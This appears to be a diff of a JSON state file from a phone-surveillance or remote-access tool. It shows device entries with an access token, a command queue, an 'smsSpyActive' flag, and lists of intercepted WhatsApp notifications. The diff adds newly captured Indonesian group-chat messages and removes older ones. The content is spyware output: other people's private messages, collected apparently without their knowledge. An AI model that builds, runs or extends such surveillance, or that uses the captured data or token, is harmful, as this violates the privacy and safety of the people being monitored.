@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775045221353,
+    "lastSeen": 1775045225409,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15606 pesan dari 10 chat",
+        "time": "01/04 20:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045225610
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13376 pesan): ~ Bot",
+        "content": "📷 🎮 TEBAKGAMBAR\n\nGambar mie, kuman, dan sofa.\n\n⏳ Jawab dalam 60 detik!\n📌 CARA JAWAB: Balas/Reply pesan ini dengan jawabanmu!\n> gunakan .nyerah untuk menyerah.",
+        "time": "01/04 20:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045225584
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "01/04 19:57",
         "pkg": "com.whatsapp",
         "receivedAt": 1775044653021
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15486 pesan dari 10 chat",
-        "time": "01/04 19:57",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044652394
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13223 pesan): ~ 🕷️",
-        "content": "menarik tunai",
-        "time": "01/04 19:57",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044652306
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13376 pesan): ~ Bot",
+        "content": "📷 🎮 TEBAKGAMBAR\n\nGambar mie, kuman, dan sofa.\n\n⏳ Jawab dalam 60 detik!\n📌 CARA JAWAB: Balas/Reply pesan ini dengan jawabanmu!\n> gunakan .nyerah untuk menyerah.",
+        "time": "01/04 20:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045225514
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13375 pesan): ~ 🕷️",
+        "content": ". tebakgambar",
+        "time": "01/04 20:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045223139
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8048,22 +8064,6 @@
         "time": "01/04 19:57",
         "pkg": "com.whatsapp",
         "receivedAt": 1775044652381
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13223 pesan): ~ 🕷️",
-        "content": "menarik tunai",
-        "time": "01/04 19:57",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044652292
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13222 pesan): ~ Bot",
-        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
-        "time": "01/04 19:57",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044649282
       }
     ],
     "galleryPhotos": [],
